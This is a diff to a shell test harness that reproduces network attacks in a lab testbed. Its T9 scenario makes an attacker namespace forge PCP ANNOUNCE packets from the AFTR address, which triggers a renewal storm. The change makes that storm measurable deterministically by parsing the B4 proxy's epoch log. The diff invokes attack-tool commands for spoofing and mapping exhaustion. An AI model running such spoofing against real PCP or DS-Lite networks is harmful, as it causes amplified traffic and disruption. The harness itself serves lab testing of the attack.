@@ -229,6 +229,19 @@ restart_pcp() {
     sleep 1.2
 }
 
+# Restart the B4-1 PCP proxy from a clean client state, logging to a known file.
+# The proxy's relayed-mapping table (its RFC 6887 8.5 epoch state) otherwise
+# persists and grows across runs, so an ANNOUNCE renewal storm would reflect every
+# mapping seeded since boot rather than this run's seed. Resetting it makes the T9
+# measurement deterministic. Mirrors the setup.sh launch (same log path).
+B41_PROXY_LOG=/var/log/pcp-proxy-b4-1.log
+reset_b4proxy() {
+    pkill -9 -f "pcp_proxy.py --lan-ip $GW1" 2>/dev/null; sleep 0.4
+    : > "$B41_PROXY_LOG" 2>/dev/null || true
+    nse b4-1 sh -c "python3 /testbed/b4/pcp_proxy.py --lan-ip $GW1 --b4-ip6 $VB4 --aftr-ip6 $AFTR --passthrough-third-party >$B41_PROXY_LOG 2>&1 &"
+    sleep 2
+}
+
 # Resolve a knob value: knob_val <NAME> <default>. Reads KNOB_<NAME> env if set.
 knob_val() { local v="KNOB_$1"; echo "${!v:-$2}"; }
 
@@ -571,35 +584,37 @@ _ns_of() { case "$1" in 10.0.1.*) echo client1;; 10.0.2.*) echo client2;; *) ech
 # T9 - PCP ANNOUNCE Spoof / Epoch Reset (one packet -> mass renew storm)
 # ─────────────────────────────────────────────────────────────────────────
 spec_T9() { echo "1-attacker-announce|attacker|eth-isp|udp port 5351 or udp port 5350;2-b4-renew-storm|b4-1|eth-isp|udp port 5351 or udp port 5350"; }
-knobs_T9() { echo "count:10"; }
+knobs_T9() { echo "count:10; seed:60"; }
 do_T9() {
-    local outdir="$1" cnt; cnt=$(knob_val COUNT 10)
+    local outdir="$1" cnt seed; cnt=$(knob_val COUNT 10); seed=$(knob_val SEED 60)
     urpf off; ensure_attacker_isp
     restart_pcp 1024
+    reset_b4proxy               # clean the B4 client mapping table -> deterministic storm
     step "Surface: PCP ANNOUNCE / restart signal. A reset makes clients believe the server rebooted."
-    step "Seed: create a batch of legit mappings so there is something to renew."
-    nse client1 sh -c "timeout 8 python3 $T/infra/pcp_attack.py exhaust --proxy-ip $GW1 --count 60 >/dev/null 2>&1"
+    step "Seed: create $seed legit mappings on the B4 so there is a mapping table to renew."
+    nse client1 sh -c "timeout 8 python3 $T/infra/pcp_attack.py exhaust --proxy-ip $GW1 --count $seed >/dev/null 2>&1"
     start_caps "$(spec_T9)" "$outdir" "T9"
-    step "Attack: attacker forges PCP ANNOUNCE (server-restart signal) from the AFTR address."
-    # Count the renewal storm from a dedicated UNCAPPED, fixed-${win}s-window
-    # capture. The shared start_caps captures are packet-capped (CAP_MAX) to bound
-    # file size, which truncates the storm; the reported figure uses this uncapped
-    # window so it reflects the true renewal rate (thousands of packets in ${win}s).
-    local win=10 stormpcap; stormpcap="$outdir/T9_renew-window.pcap"
-    nse b4-1 timeout "$win" tcpdump -ni eth-isp -U -s0 "udp port 5351" -w "$stormpcap" >/dev/null 2>&1 &
-    local scap=$!; sleep 1
+    step "Attack: attacker forges $cnt PCP ANNOUNCE (server-restart signal) from the AFTR address."
     local cmd="python3 $T/infra/pcp_attack.py announce --interface eth-isp --aftr-ip6 $AFTR --count $cnt"
     CMDS_RUN="attacker: $cmd"
-    nse attacker sh -c "timeout $win $cmd >/dev/null 2>&1"
-    wait "$scap" 2>/dev/null   # the ${win}s storm window closes here
+    nse attacker sh -c "timeout 12 $cmd >/dev/null 2>&1"
+    sleep 2                     # let the proxy finish emitting the renewals to its log
     stop_caps; cap_summary
-    step "Measure: how much MAP-renew traffic did the ANNOUNCE burst provoke in ${win}s?"
-    local storm; storm=$(pcap_count "$stormpcap" "udp port 5351")
-    info "PCP MAP-renew traffic on the B4 uplink in a ${win}s window = $storm packets (from $cnt announces)"
+    step "Measure: how many mappings did each ANNOUNCE force the B4 to re-create?"
+    # Deterministic ground truth from the B4 proxy's own epoch log (RFC 6887 8.5):
+    # each backward-epoch ANNOUNCE re-creates the WHOLE mapping table, so the renewal
+    # count is (# ANNOUNCE) x (mappings held) and does not depend on capture timing.
+    # (A raw packet capture undercounts/overcounts with proxy state and buffering,
+    # which is why the earlier tcpdump-window figure was not reproducible.)
+    local resets per renewals
+    resets=$(grep -c 'EPOCH RESET' "$B41_PROXY_LOG" 2>/dev/null); resets=${resets:-0}
+    per=$(grep -oE 're-creating [0-9]+ mapping' "$B41_PROXY_LOG" 2>/dev/null | grep -oE '[0-9]+' | sort -rn | head -1); per=${per:-0}
+    renewals=$(grep -oE 'renewal storm sent: [0-9]+' "$B41_PROXY_LOG" 2>/dev/null | grep -oE '[0-9]+' | awk '{s+=$1} END{print s+0}')
+    info "each ANNOUNCE re-created all $per mappings; $resets ANNOUNCE -> $renewals renewal MAP requests on the B4 uplink"
     restart_pcp 1024
-    REF_LINE="one ANNOUNCE burst triggers a renew storm (thousands of MAP packets in a ${win}s window)"
-    RUN_LINE="MAP-renew packets = $storm in ${win}s after $cnt ANNOUNCE"
-    [ "$storm" -gt "$cnt" ] && VERDICT_PASS=1 || VERDICT_PASS=0
+    REF_LINE="each ANNOUNCE re-creates the B4's full mapping table; $cnt announces x $seed mappings = $((cnt*seed)) renewal MAP requests"
+    RUN_LINE="renewal MAP requests = $renewals ($per per ANNOUNCE x $resets ANNOUNCE)"
+    { [ "$resets" -eq "$cnt" ] && [ "$per" -ge 1 ] && [ "$renewals" -eq "$((resets*per))" ]; } && VERDICT_PASS=1 || VERDICT_PASS=0
 }
 
 # ─────────────────────────────────────────────────────────────────────────
